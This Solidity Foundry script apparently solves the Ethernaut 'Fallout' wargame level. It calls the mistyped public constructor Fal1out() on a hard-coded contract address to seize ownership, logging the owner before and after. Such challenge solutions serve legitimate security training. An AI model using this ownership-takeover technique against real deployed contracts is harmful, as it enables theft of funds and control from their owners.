// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract ForceSolution is Script {
    Fallout public fallout;

    function run() external {
        vm.startBroadcast();// vm.envUint("PRIVATE_KEY") <= Faulty

        console.log("Solving Fallout...");
        // if (block.chainid == 11155111) {
        //     token = Token(0x60bF87c457fe67d023B6cE684B2e83B7b73dd5c8);
        // } else {
        //     token = new Token(20);
        // }
        fallout = Fallout(0x4bcEa780f1b67D761f6Db284166ecf9B83A067A8);
        console.log("owner: ", fallout.owner());
        fallout.Fal1out();
        console.log("owner: ", fallout.owner());
        vm.stopBroadcast();
        console.log("Fallout Solved!");
    }
}
